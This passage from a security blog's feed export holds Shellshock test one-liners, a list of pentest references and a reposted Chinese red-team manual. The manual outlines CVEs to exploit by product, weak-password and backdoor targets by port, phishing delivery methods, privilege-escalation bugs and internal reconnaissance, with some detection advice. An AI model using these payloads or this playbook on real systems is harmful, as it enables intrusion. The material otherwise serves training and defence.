redir_stack&quot;</code></p>\n</li>\n<li>\n<p>CVE-2014-7187<br />\n <code>(for x in &#123;1..200&#125; ; do echo &quot;for x$x in ; do :&quot;; done; for x in &#123;1..200&#125; ; do echo done ; done) | bash || echo &quot;CVE-2014-7187 vulnerable, word_lineno&quot;</code></p>\n</li>\n<li>\n<p>CVE-2014-6278<br />\n <code>env X='() &#123; _; &#125; &gt;_[$($())] &#123; echo CVE-2014-6278 vulnerable; id; &#125;' bash -c :</code></p>\n</li>\n</ul>\n<h2 id=\"references\"><a class=\"anchor\" href=\"#references\">#</a> References</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdXBwb3J0Lm9mZmVuc2l2ZS1zZWN1cml0eS5jb20vIyFvc2NwLWV4YW0tZ3VpZGUubWQ=\">OSCP Exam Guide</span> - MUST read!</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2JpdHZpamF5cy5naXRodWIuaW8v\">The Magic of Learning</span> - a real treasure trove!</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mdXp6eXNlY3VyaXR5LmNvbQ==\">FuzzySecurity</span> - this is something you must bookmark... period. I found the <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mdXp6eXNlY3VyaXR5LmNvbS90dXRvcmlhbHMvMTYuaHRtbA==\">Windows Privilege Escalation Fundamentals</span> especially useful.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29tcHV0ZXJob3BlLmNvbS93bWljLmh0bQ==\">WMIC reference/guide</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvc3lzaW50ZXJuYWxzLw==\">SysInternals</span> - this is a must have for working on Windows boxes.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdA==\">PowerSploit</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ncmV5aGF0aGFja2VyLm5ldC8/cD03Mzg=\">Elevating privileges by exploiting weak folder permissions</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jYXJuYWwwd25hZ2UuY29tL3BhcGVycy9MQVJFUy1Db2xkRnVzaW9uLnBkZg==\">ColdFusion for PenTesters</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5nbnVjaXRpemVuLm9yZy9ibG9nL2NvbGRmdXNpb24tZGlyZWN0b3J5LXRyYXZlcnNhbC1mYXEtY3ZlLTIwMTAtMjg2MS8=\">ColdFusion Path Traversal</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvcGVuZXRyYXRpb24tdGVzdGluZy10b29scy1jaGVhdC1zaGVldC8=\">Penetration Testing Tools Cheat Sheet</span> - Good read. Check out other cheat sheets on this page too!</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2t1cm9iZWF0cy9maW1hcA==\">fimap</span> - LFI/RFI scanner</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3p0Z3JhY2UvY2hhbmdlbWU=\">Changeme</span> - default password scanner</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaXJ0Lm5ldC9wYXNzd29yZHM=\">CIRT Default Passwords DB</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3Jlc291cmNlcy5pbmZvc2VjaW5zdGl0dXRlLmNvbS9sb2NhbC1maWxlLWluY2x1c2lvbi1jb2RlLWV4ZWN1dGlvbg==\">From LFI to Shell</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvbGludXgtY29tbWFuZHMtY2hlYXQtc2hlZXQv\">Useful Linux commands</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmVib290dXNlci5jb20vP3A9MTYyMw==\">Local Linux Enumeration</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9uZXRzZWMud3MvP3A9MzMx\">Creating Metasploid Payloads</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL211Yml4L3NoZWxsc2hvY2tlci1wb2Nz\">Shellshock PoCs</span></li>\n</ul>\n",
            "tags": [
                "RedTeam"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Reference/RedTeamer/",
            "url": "https://or0kit.github.io/PenetrationTest/Reference/RedTeamer/",
            "title": "红方人员实战手册【转】",
            "date_published": "2021-01-18T07:13:54.000Z",
            "content_html": "<h1 id=\"红方人员实战手册\"><a class=\"anchor\" href=\"#红方人员实战手册\">#</a> 红方人员实战手册</h1>\n<h2 id=\"声明\"><a class=\"anchor\" href=\"#声明\">#</a> 声明</h2>\n<pre><code>Author : By klion\nDate   : 2020.2.15\n寄语    : 愿 2020 后面的每一天都能一切安好\n\n</code></pre>\n<h2 id=\"分享初衷\"><a class=\"anchor\" href=\"#分享初衷\">#</a> 分享初衷</h2>\n<pre><code>一来, 旨在为 &quot;攻击&quot; / &quot;防御&quot;方 提供更加全面实用的参考\n还是那句老闲话 &quot;未知攻焉知防&quot;, 所有单纯去说 &quot;攻&quot; 或者 &quot;防&quot; 的都是耍流氓, 攻守兼备才能把路越走越宽\n\n二来, 也是为秉承共享协作, 希望能为 红队 及 部分实战攻防研究人员 做出自己应有的贡献\n个人一直坚信, 真正的价值来源于实实在在的奉献,与其天天到处嘴炮,不如静下心来多反思下自己,好好踏踏实实做些对大家都有益的事\n\n</code></pre>\n<h2 id=\"丑话说在前面\"><a class=\"anchor\" href=\"#丑话说在前面\">#</a> 丑话说在前面</h2>\n<pre><code>严禁任何 个人/组织机构 利用以下相关技术去从事任何未经合法授权的 网络入侵攻击破坏或者黑产活动\n严禁任何 个人/组织机构 以此来进行任何形式的 商业牟利 或 恶意炒作行为,包括各类非法渗透培训,误人子弟的负面恶意引导等....\n严禁一切的恶意传播及非法利用,由此所产生的一切恶果也均由读者自行承担\n\n</code></pre>\n<h2 id=\"说明\"><a class=\"anchor\" href=\"#说明\">#</a> 说明</h2>\n<pre><code>以下仅针对日常 &quot;红队&quot; 场景, 进行了一次相对全面完整的实战攻击利用技术提炼汇总\n针对不同的渗透阶段,所可能会用到的一些技术都做了详尽梳理说明 (后面可能还会整理出对应的完整工具链,虽然那不是最主要的)\n由于红队不同于一般的渗透测试, 强调更多的是如何搞进去拿到相应机器权限 或者 实现某特定目的\n而不局限于你一定要在什么时间, 用什么技术 或者 必须通过什么途径去搞,相比传统渗透测试,红队则更趋于真实的入侵活动\n这种场景其实对防御者的 实战对抗经验 和 技术深度 都是比较大的挑战\n所以,以下的所有技术点也几乎都是完全站在这种场景和角度下来考量梳理的\n需要特别说明的是, 所有攻击手法在现实中都绝不是完全孤立使用的, 往往很多手法都是相互灵活组合起来进行循环利用\n由于绝大部分内容都是基于本人平时学习实战积累的一些经验,加之每个人的实际渗透思路都不同\n所以肯定会有遗漏的地方,也欢迎弟兄们一起来积极指正补充完善\n个人觉得,最好的防御永远不是怎么去防某个工具,是个明白人都知道,因为工具这些东西本身就是死的\n稍微改下,定制下, 现有的规则可能马上就防不住了,且一直会处于疲于应付的被动防御状态\n尤其是针对红队这种特殊场景的,你的实际对手很可能都是有一定技术实力的人\n所以针对每种核心的攻击技术技术展开做深入分析, 直接从源头上进行防御才是最靠谱的\n虽然说短期这种成本代价相对较高, 但长期来看, 是一劳永逸的, 沉淀下来的这些东西最终也会慢慢形成自己产品的核心竞争力和特色\n说白点,这种对抗,本质上拼的还是双方的技术实力,不仅要能在不知觉的情况下搞进去,而且要能无限制加大对方后期的溯源成本\n另外,作为一名合格的攻防人员,工具的熟练掌握仅仅只是极小的一部分,对各种利用原理的深度理解和二次定制能力才是你的核心\n\n</code></pre>\n<h2 id=\"日常流程简要说明\"><a class=\"anchor\" href=\"#日常流程简要说明\">#</a> 日常流程简要说明</h2>\n<pre><code>入口权限 =&gt; 内网搜集/探测 =&gt; 免杀提权[非必须] =&gt; 抓取登录凭证 =&gt; 跨平台横向 =&gt; 入口维持 =&gt; 数据回传 =&gt; 定期权限维护\n\n</code></pre>\n<h2 id=\"0x01-入口权限获取-前期侦察搜集阶段本身就不存在太多可防御的点非防御重心\"><a class=\"anchor\" href=\"#0x01-入口权限获取-前期侦察搜集阶段本身就不存在太多可防御的点非防御重心\">#</a> 0x01 入口权限获取 [前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心]</h2>\n<pre><code>绕CDN找出目标所有真实ip段\n找目标的各种Web管理后台登录口\n批量抓取目标所有真实C段 Web banner\n批量对目标所有真实C段 进行基础服务端口扫描探测识别\n尝试目标DNS是否允许区域传送,如果不允许则继续尝试子域爆破\n批量抓取目标所有子域 Web banner\n批量对目标所有子域集中进行基础服务端口探测识别\n批量识别目标 所有存活Web站点的Web程序指纹 及其详细版本\n从 Git 中查找目标泄露的各类 敏感文件 及 账号密码,偶尔甚至还能碰到目标不小心泄露的各种云的 &quot;AccessKey&quot;\n从网盘 / 百度文库 中查找目标泄露的各类 敏感文件 及 账号密码\n从各第三方历史漏洞库中查找目标曾经泄露的 各种敏感账号密码 [ 国内目标很好使 ]\n目标Svn里泄露的各类 敏感文件\n网站目录扫描 [ 查找目标网站泄露的各类敏感文件, 网站备份文件, 敏感配置文件, 源码 , 别人的webshell, 等等等...]\n目标站点自身在前端代码中泄露的各种敏感信息\nfofa / shodan / bing / google  hacking 深度利用\n搜集目标 学生学号 / 员工工号 / 目标邮箱 [ 并顺手到各个社工库中去批量查询这些邮箱曾经是否泄露过密码 ]\n目标自己对外提供的各种 技术文档 / wiki 里泄露的各种账号密码及其它敏感信息\n目标微信小程序\n分析目标app Web请求\n借助js探针搜集目标内网信息\n想办法混入目标的各种 内部QQ群 / 微信群\n分析目标直接供应商 [尤其是技术外包]\n根据前面已搜集到的各类信息制作有针对性的弱口令字典\n目标所用 Waf 种类识别 与 绕过\nBypassWAF 文件上传 / 读取 / 下载\n   BypassWAF Sql注入\n   BypassWAF RCE\n   BypassWAF 各类Java Web中间件已知Nday漏洞利用\n   BypassWAF Webshell 免杀\n\t\n其它更多 , 待补充修正...\n\n</code></pre>\n<h2 id=\"0x02-入口权限获取-外部防御重心-重中之重\"><a class=\"anchor\" href=\"#0x02-入口权限获取-外部防御重心-重中之重\">#</a> 0x02 入口权限获取 [外部防御重心 ( &quot;重中之重&quot;) ]</h2>\n<pre><code>此阶段,主要是针对各主流 &quot;中间件 + 开源程序 + Web服务组件&quot; 自身的各种已知Nday漏洞利用\n如下已按 &quot;实际攻击利用的难易程度&quot; 及 &quot;获取到的shell权限高低&quot; 为标准进行了详细排序,由于完全以实战利用为导向\n故,仅仅只挑选了一些相对会经常遇到的,且实战中确实能有效协助快速getshell 的 &quot;中间件&quot; , &quot;开源程序&quot; 及 &quot;web组件&quot;\n\n</code></pre>\n<h2 id=\"针对各类java中间件的各种已知nday漏洞利用\"><a class=\"anchor\" href=\"#针对各类java中间件的各种已知nday漏洞利用\">#</a> 针对各类 Java 中间件的各种已知 Nday 漏洞利用</h2>\n<pre><code>不同于其它脚本类web程序,Java的运行权限通常都比较高,甚至大部分都是直接用root/administrator/system权限在跑\n所以拿到的shell权限一般也非常高,通常都直接是服务器权限\n尤其是在各种红队场景中,入侵者一般也都会首选这些点,并以此为突破口来获取一个稳定的跳板机入口权限\n关于到底哪些行业特别爱用哪些中间件,这些也应该都是有事先分析梳理汇总好的\n\n</code></pre>\n<ul>\n<li>Struts2</li>\n</ul>\n<pre><code>Struts2-005\nStruts2-008\nStruts2-009\nStruts2-013\nStruts2-016(实际上,很多都老系统都漏补了这个洞,成功率较高)\nStruts2-019\nStruts2-020\nStruts2-devmode\nStruts2-032\nStruts2-033\nStruts2-037\nStruts2-045\nStruts2-046\nStruts2-048\nStruts2-052\nStruts2-053\nStruts2-057\n\n</code></pre>\n<ul>\n<li>weblogic</li>\n</ul>\n<pre><code>CVE-2019-2725\nCVE-2019-2729\nCVE-2018-3191\nCVE-2018-2628\nCVE-2018-2893\nCVE-2018-2894\nCVE-2017-3506\nCVE-2017-10271\nCVE-2017-3248\nCVE-2016-0638\nCVE-2016-3510\nCVE-2015-4852\nCVE-2014-4210\n\nSSRF\n控制台弱口令,部署webshell\n\n</code></pre>\n<ul>\n<li>Jboss</li>\n</ul>\n<pre><code>CVE-2015-7501\nCVE-2017-7504\nCVE-2017-12149\n\n未授权访问,部署webshell\n控制台弱口令,部署webshell\n\n</code></pre>\n<ul>\n<li>wildfly [jboss 7.x 改名为 wildfly]</li>\n</ul>\n<pre><code>控制台弱口令,部署webshell\n\n</code></pre>\n<ul>\n<li>Tomcat</li>\n</ul>\n<pre><code>CVE-2016-8735\nCVE-2017-12615 [ readonly 实际设为 true的情况较少,稍鸡肋 ]\nCVE-2020-1938 [ AJP协议漏洞, 直接把8009端口暴露在外网的不太多,稍鸡肋 ]\n\n控制台弱口令,部署webshelll [ 注: 7.x版本后,默认加了防爆机制 ]\n\n</code></pre>\n<ul>\n<li>Jekins</li>\n</ul>\n<pre><code>CVE-2018-1999002 [任意文件读取]\n\n未授权访问,任意命令执行\n控制台弱口令,任意命令执行\n\n</code></pre>\n<ul>\n<li>ElasticSearch</li>\n</ul>\n<pre><code>CVE-2014-3120 [专门针对老版本(无沙盒)RCE]\nCVE-2015-1427 [Groovy RCE]\nCVE-2015-3337 [任意文件读取]\n\n未授权访问,敏感信息泄露\n\n</code></pre>\n<ul>\n<li>RabbitMQ</li>\n</ul>\n<pre><code>弱口令\n\n</code></pre>\n<ul>\n<li>Glassfish</li>\n</ul>\n<pre><code>任意文件读取 [ 低版本 ]\n控制台弱口令,部署webshell\n\n</code></pre>\n<ul>\n<li>IBM Websphere</li>\n</ul>\n<pre><code>Java 反序列化\n控制台弱口令,部署webshell\n\n</code></pre>\n<ul>\n<li>Axis2</li>\n</ul>\n<pre><code>任意文件读取\n目录遍历\n\n</code></pre>\n<ul>\n<li>Apache ActiveMQ</li>\n</ul>\n<pre><code>未授权访问,5.12 之前的版本 fileserver存在 PUT任意写\nCVE-2015-5254\n\n</code></pre>\n<ul>\n<li>Apache Solr</li>\n</ul>\n<pre><code>CVE-2017-12629\nCVE-2019-0193 [ Apache Solr 5.x - 8.2.0 ]\n\n</code></pre>\n<ul>\n<li>Apache Zookeeper</li>\n</ul>\n<pre><code>未授权访问,敏感信息泄露\n\n</code></pre>\n<ul>\n<li>Apache Shiro 反序列化</li>\n<li>fastjson &lt;= 1.2.47 反序列化利用</li>\n</ul>\n<h2 id=\"针对各类windows-php集成环境-由于此类环境拿到的webshell权限相对较高所以通常也是红队人员的首选突破口\"><a class=\"anchor\" href=\"#针对各类windows-php集成环境-由于此类环境拿到的webshell权限相对较高所以通常也是红队人员的首选突破口\">#</a> 针对各类 Windows php 集成环境  [由于此类环境拿到的 Webshell 权限相对较高，所以，通常也是红队人员的首选突破口]</h2>\n<pre><code>AppServ\nXampp\n宝塔\nPhpStudy\t\t\n......\n\n</code></pre>\n<h2 id=\"针对各类开源程序的-已知nday漏洞利用\"><a class=\"anchor\" href=\"#针对各类开源程序的-已知nday漏洞利用\">#</a> 针对各类开源程序的 已知 Nday 漏洞利用</h2>\n<pre><code>Dedecms \t后台弱口令,系列已知nday漏洞利用\nthinkphp 5.x \t后台弱口令,系列已知nday漏洞利用\nphpcms \t\t后台弱口令,系列已知nday漏洞利用\necshop \t\t后台弱口令,系列已知nday漏洞利用\nMetinfo \t后台弱口令,系列已知nday漏洞利用\ndiscuz \t\t后台弱口令,系列已知nday漏洞利用\n帝国cms \t后台弱口令,系列已知nday漏洞利用\nphpmyadmin \t数据库弱口令,系列已知nday漏洞利用\nwordpress \t后台弱口令,系列已知nday漏洞利用\njoomla \t\t后台弱口令,系列已知nday漏洞利用\ndrupal \t\tCVE-2018-7600 ,后台弱口令,系列已知nday漏洞利用\n......\n\n</code></pre>\n<h2 id=\"针对其它各类web组件的-已知nday漏洞利用\"><a class=\"anchor\" href=\"#针对其它各类web组件的-已知nday漏洞利用\">#</a> 针对其它各类 Web 组件的 已知 Nday 漏洞利用</h2>\n<ul>\n<li>IIS 6.0 RCE</li>\n</ul>\n<pre><code>短文件漏洞\nPUT 任意写\nWebdav RCE CVE-2017-7269\n\n</code></pre>\n<ul>\n<li>禅道项目管理系统</li>\n</ul>\n<pre><code>SQL注入\n文件读取\n远程执行\n\n</code></pre>\n<ul>\n<li>通达 OA</li>\n</ul>\n<pre><code>SQL注入\n任意上传\n\n</code></pre>\n<ul>\n<li>Exchange</li>\n</ul>\n<pre><code>利用接口进行邮箱用户名枚举\n针对各个接口的弱口令爆破\nCVE-2020-0688 [ 利用前提是需要先得有任意一个邮箱用户权限 ]\n....\n\n</code></pre>\n<ul>\n<li>Zimbra [ XXE + SSRF =&gt; RCE ]</li>\n</ul>\n<pre><code>CVE-2013-7091\nCVE-2016-9924\nCVE-2019-9670\n\n</code></pre>\n<ul>\n<li>Citrix</li>\n</ul>\n<pre><code>CVE-2019-19781\n\n</code></pre>\n<ul>\n<li>Jumpserver</li>\n</ul>\n<pre><code>身份验证绕过\n\n</code></pre>\n<ul>\n<li>Zabbix</li>\n</ul>\n<pre><code>CVE-2017-2824\nSQL注入 [ 2.0 老版本 ]\n控制台弱口令,敏感机器信息泄露\n\n</code></pre>\n<ul>\n<li>Cacti</li>\n</ul>\n<pre><code>低版本 SQL注入\n控制台弱口令\n\n</code></pre>\n<ul>\n<li>Nagios</li>\n</ul>\n<pre><code>CVE-2016-9565\n控制台弱口令\n\n</code></pre>\n<ul>\n<li>Webmin RCE</li>\n</ul>\n<pre><code>CVE-2019-15107 \n\n</code></pre>\n<ul>\n<li>PHPMailer</li>\n</ul>\n<pre><code>CVE-2016-10033\n\n</code></pre>\n<ul>\n<li>泛微 OA 远程代码执行</li>\n<li>金蝶 OA SQL 注入</li>\n<li>Coremail 敏感文件泄露</li>\n<li>UEditor 任意文件上传</li>\n<li>OpenSSL 心脏滴血抓明文账号密码  [Heartbleed]</li>\n<li>破壳漏洞 [Shellshock]</li>\n</ul>\n<h2 id=\"各种能快速getshell的常规基础web漏洞利用-注-有些漏洞在不审代码的情况下其实是很难有效盲测到的\"><a class=\"anchor\" href=\"#各种能快速getshell的常规基础web漏洞利用-注-有些漏洞在不审代码的情况下其实是很难有效盲测到的\">#</a> 各种能快速 getshell 的常规基础 Web 漏洞利用 [注：有些漏洞在不审代码的情况下其实是很难有效盲测到的]</h2>\n<pre><code>后台弱口令\nSSRF\nsql注入\n越权\n命令 / 代码执行 / 反序列化\n任意文件上传 / 下载 / 读取\n包含\nXSS（实际上,XSS只有在针对某些特定邮箱,手里有浏览器0day时价值才会比较大,红队场景下其实并不是非常致命)\n业务逻辑漏洞\n\n</code></pre>\n<h2 id=\"针对各类边界网络设备的各种利用主要是web管理控制台登录弱口令-及-各类已知nday攻击利用\"><a class=\"anchor\" href=\"#针对各类边界网络设备的各种利用主要是web管理控制台登录弱口令-及-各类已知nday攻击利用\">#</a> 针对各类边界网络设备的各种利用，主要是 Web 管理控制台登录弱口令 及 各类已知 nday 攻击利用</h2>\n<ul>\n<li>Pulse Secure VPN</li>\n</ul>\n<pre><code>CVE-2019-11510 [ 任意文件读取 ]\n\n</code></pre>\n<ul>\n<li>Fortinet VPN</li>\n</ul>\n<pre><code>CVE-2018-13379 [ 文件读取 ]\n\n</code></pre>\n<ul>\n<li>Sangfor Vpn RCE</li>\n</ul>\n<h2 id=\"0x03-入口权限获取-专门针对各类基础服务端口的各种getshell利用防御重点-重中之重\"><a class=\"anchor\" href=\"#0x03-入口权限获取-专门针对各类基础服务端口的各种getshell利用防御重点-重中之重\">#</a> 0x03 入口权限获取 [专门针对各类基础服务端口的各种 getshell 利用，防御重点 ( &quot;重中之重&quot;) ]</h2>\n<pre><code>此处仅仅只挑选了一些实战中真正能协助快速getshell的服务,其它的一些相对边缘性的服务均未提及 \n同样,已按 &quot;实际攻击利用的难易程度&quot; 及 &quot;获取到的shell权限高低&quot; 为标准进行了详细排序\n如下,就每个端口的具体攻击利用方式,进行了简要说明\n\n</code></pre>\n<ul>\n<li>Top Port List</li>\n</ul>\n<pre><code>Mssql \t  [ 默认工作在tcp 1433端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]\nSMB       [ 默认工作在tcp 445端口, 弱口令, 远程执行, 后门植入 ]\nWMI       [ 默认工作在tcp 135端口, 弱口令, 远程执行, 后门植入 ]\nWinRM\t  [ 默认工作在tcp 5985端口, 此项主要针对某些高版本Windows, 弱口令, 远程执行, 后门植入 ]\nRDP       [ 默认工作在tcp 3389端口, 弱口令, 远程执行, 别人留的shift类后门 ]\nSSH       [ 默认工作在tcp 22端口, 弱口令, 远程执行, 后门植入 ]\nORACLE    [ 默认工作在tcp 1521端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]\nMysql     [ 默认工作在tcp 3306端口, 弱口令, 敏感账号密码泄露, 提权(只适用于部分老系统) ]\nREDIS\t  [ 默认工作在tcp 6379端口, 弱口令, 未授权访问, 写文件(webshell,启动项,计划任务), 提权 ]\nPOSTGRESQL[ 默认工作在tcp 5432端口, 弱口令, 敏感信息泄露 ]\nLDAP      [ 默认工作在tcp 389端口, 未授权访问, 弱口令, 敏感账号密码泄露 ]\nSMTP      [ 默认工作在tcp 25端口, 服务错误配置导致的用户名枚举漏洞, 弱口令, 敏感信息泄露 ]\nPOP3      [ 默认工作在tcp 110端口, 弱口令, 敏感信息泄露 ]\nIMAP      [ 默认工作在tcp 143端口, 弱口令, 敏感信息泄露 ]\nExchange  [ 默认工作在tcp 443端口, 接口弱口令爆破 eg: Owa,ews,oab,AutoDiscover... pth脱邮件, 敏感信息泄露 ... ]\nVNC       [ 默认工作在tcp 5900端口, 弱口令 ]\nFTP       [ 默认工作在tcp 21端口, 弱口令, 匿名访问/可写, 敏感信息泄露 ]\nRsync     [ 默认工作在tcp 873端口, 未授权, 弱口令, 敏感信息泄露 ]\nMongodb   [ 默认工作在tcp 27017端口, 未授权, 弱口令 ]\nTELNET    [ 默认工作在tcp 23端口, 弱口令, 后门植入 ]\nSVN       [ 默认工作在tcp 3690端口, 弱口令, 敏感信息泄露 ]\nJAVA RMI  [ 默认工作在tcp 1099端口, 可能存在反序列化利用 ]\nCouchDB   [ 默认工作在tcp 5984端口, 未授权访问 ]\n\n</code></pre>\n<h2 id=\"0x04-入口权限获取\"><a class=\"anchor\" href=\"#0x04-入口权限获取\">#</a> 0x04 入口权限获取</h2>\n<h2 id=\"传统钓鱼攻击利用实际护网场景中用的非常频繁细节非常多此处不一一列举防御重点\"><a class=\"anchor\" href=\"#传统钓鱼攻击利用实际护网场景中用的非常频繁细节非常多此处不一一列举防御重点\">#</a> 传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点</h2>\n<ul>\n<li>发信前期准备</li>\n</ul>\n<pre><code>枚举有效的目标邮箱用户名列表\n批量探测目标邮箱弱口令\n伪造发信人 [ 发信邮服搭建 ]\n钓鱼信 [ 针对不同行业一般也都会事先准备好各种各样的针对性的发信话术模板,以此来提到实际发信成功率 ]\n......\n\n</code></pre>\n<ul>\n<li>典型投递方式</li>\n</ul>\n<pre><code>第一种,直接给目标发送各种常规木马信 \n\n传统宏利用\n捆绑\nexe[zip,7z]\nlnk\nchm\n自解压\n木马链接\nOLE\nCVE-2017-11882 [ 利用漏洞触发 ]\n...\n\n</code></pre>\n<pre><code>第二种,给目标发送各种钓鱼链接,比如, 利用各种目标登录口的钓鱼页面来窃取各种内网账号密码 \n\nVpn\nMail\nOA\nNet ntlm hash [ 远程模板注入,pdf...钓hash,国内ISP过滤SMB流量不适用 ]\n......\n\n</code></pre>\n<h2 id=\"0x05-主机安全-提权利用防御重点\"><a class=\"anchor\" href=\"#0x05-主机安全-提权利用防御重点\">#</a> 0x05 主机安全 [提权利用，防御重点]</h2>\n<pre><code>以下只单独挑了一些在 通用性, 稳定性, 易用性, 实际成功率 都相对较好的洞 和 方式 其它的一些&quot;边缘性&quot;的利用都暂未提及\n\n</code></pre>\n<ul>\n<li>Windows 系统漏洞 本地提权 [成功的前提是，保证事先已做好各种针对性免杀]</li>\n</ul>\n<pre><code>BypassUAC [ win7 / 8  / 8.1 / 10 ]\nMS14-058[KB3000061]\t\t\t\t    [重点]\nMS14-068[KB3011780]\t\t\t\t    [重点]\nms15-051[KB3045171]\t\t\t\t    [重点]\nMS15-077[KB3077657]\t\t\t\t    [重点]\nMS16-032[KB3124280]\t\t\t\t    [重点]\nms16-075\t\t\t\t\t    [重点]\nMS16-135[KB3199135]\t\t\t\t    [重点]\nMS17-010[KB4013389]\t\t\t\t    [重点]\ncve-2019-0708\t\t\t\t\t    [重点]\nCVE-2019-0803\t\t\t\t\t    [重点]\nCVE-2019-1322 &amp; CVE-2019-1405\t\t\t    [重点]\ncve-2019-12750 [ 赛门铁克(用的较多)本地提权 ]\t    [重点]\t\t\n\n</code></pre>\n<ul>\n<li>linux 内核漏洞 本地提权 [linux-exploit-suggester]</li>\n</ul>\n<pre><code>CVE-2016-5195\t\t\t\t\t    [重点]\nCVE-2017-16995\nCVE-2019-13272\n\n</code></pre>\n<ul>\n<li>利用各类第三方服务 / 软件工具提权</li>\n</ul>\n<pre><code>Mssql \t\t\t\t\t\t    [重点]\nOracle         \t\t\t\t\t    [重点]\nMysql\n各类第三方软件dll劫持 \t\t\t\t    [重点]\nsuid权限                        \n计划任务\n各种错误服务配置利用\n\n</code></pre>\n<h2 id=\"0x06-内网安全-敏感信息搜集防御重点可在此项严格限制各种系统内置命令执行\"><a class=\"anchor\" href=\"#0x06-内网安全-敏感信息搜集防御重点可在此项严格限制各种系统内置命令执行\">#</a> 0x06 内网安全 [敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行]</h2>\n<ul>\n<li>搜集当前已控 &quot;跳板机&quot; 的各类敏感信息</li>\n</ul>\n<pre><code>注: 如下某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的,此处不再赘述\n\n查看当前shell权限 及 详细系统内核版本\n获取当前系统的 详细ip配置,包括 所在域, ip, 掩码, 网关, 主备 dns ip\n获取当前系统最近的用户登录记录\n获取当前用户的所有命令历史记录 [ 主要针对linux,里面可能包含的有各类敏感账号密码,ip,敏感服务配置... ]\n获取本机所有 服务/进程 [包括各个进程的详细权限,也包括目标系统中的可疑恶意进程(有可能是同行的马)]/端口/网络连接信息\n获取本机所用杀软 / 监控种类 [ 后续好针对性的做免杀 ]\n获取本机 rdp / ssh 端口开启状态 及 其默认端口号\n获取本机所有用户的rdp外连记录\n获取本机的所有SSH登录记录\n获取当前系统所有登录成功的日志 [ 针对windows ]\n获取本机所有已安装软件的详细列表 [ 主要为抓密码,提权,留后门做准备 ]\n获取本机各个浏览器中保存的 所有书签页 及 历史浏览记录\n获取当前用户创建的所有计划任务列表 及 计划任务所对应的执行脚本内容 [ 有些执行脚本中很可能存的有各种连接账号密码 ]\n获取当前用户 桌面 及 回收站 里的所有文件列表\n获取当前系统的所有存在suid权限的二进制程序\n获取当前系统代理 [ ip &amp; 端口 ]\n获取当前系统所有的自启动注册表项值\n获取当前系统的所有 ipc 连接 及 已启用共享\n获取当前系统的所有挂载[mount]\n获取当前系统的防火墙状态\n获取当前系统所有分区/盘符及其详细使用情况\n获取本机的累计开机时长\n获取本机arp / dns缓存\n获取当前机器环境变量 [ 主要想看看目标机器上有无python,jdk,ruby...等语言的执行环境,后期可设法利用 ]\n获取当前系统所有本地用户及组列表\n获取当前系统host文件内容\n获取当前机器硬件设备信息[ 主要为判断当前机器是否为虚拟机 ]\n远程截屏捕捉目标用户敏感操作\n\n由于上述大部分的搜集动作都是基于系统内置工具和接口,故,可完全依靠EDR来实时捕捉各类敏感进程上报恶意操作\n\n</code></pre>\n<ul>\n<li>利用当前已控 &quot;跳板机&quot;, 分析目标内网大致网络拓扑 及 所有关键性业务机器分布</li>\n<li>批量抓取内网所有 windows 机器名 和 所在 &quot;域&quot; / &quot;工作组名&quot; [smb 探测扫描]</li>\n<li>针对内网的各种高危敏感服务定位 [&quot;安全&quot; 端口扫描 (在避免对方防护报警拦截的情况下进行各种常规服务探测识别)]</li>\n<li>内网批量 Web Banner 抓取，获取关键目标业务系统如下</li>\n</ul>\n<pre><code>内网各种文件[共享]服务器\n内网各类web服务器  [ 可用于后期留入口 ]\n内网各类数据库服务器\n内网邮件服务器  [ 可用于后期留入口 ]\n内网Vpn服务器  [ 可用于后期留入口 ]\n内网各类常规资产状态监控服务器,eg: zabbix,nagios,cacti...\n内网各类防护的主控端,比如,防火墙,EDR,态势感知 产品的web主控端...\n内网日志服务器\n内网补丁服务器\n内网各类OA,ERP,CRM,SRM,HR系统... \n内网打印服务器\n内网 MES 系统 \n内网虚拟化服务器 / 超融合平台 [Vmware ESX]\n内网堡垒机...\n内网运维,研发 部门员工的机器\n内网路由,交换设备...\n等等等...\n\n针对以上的各种常规内网探测扫描,其实在流量上都会有非常清晰的表现\n通过在一些关键节点设备/服务器上部署探针搜集流量\n再配合大数据关联分析查找各种敏感特征,理论上是相对容易发现各类扫描探测痕迹的\n\n</code></pre>\n<ul>\n<li>针对各类已知系统高危 RCE 漏洞的批量探测识别与利用</li>\n</ul>\n<pre><code>MS08-067 [ 其实,某些特殊行业的系统可能非常老,极少更新,故,还是有存在的可能 ]\nMS17-010\nCVE-2019-0708\n\n其实针对此类漏洞的攻击利用识别,就显得比较直白了\n通过深入分析每种漏洞在实际攻击利用过程所产生的一些典型 流量特征 和 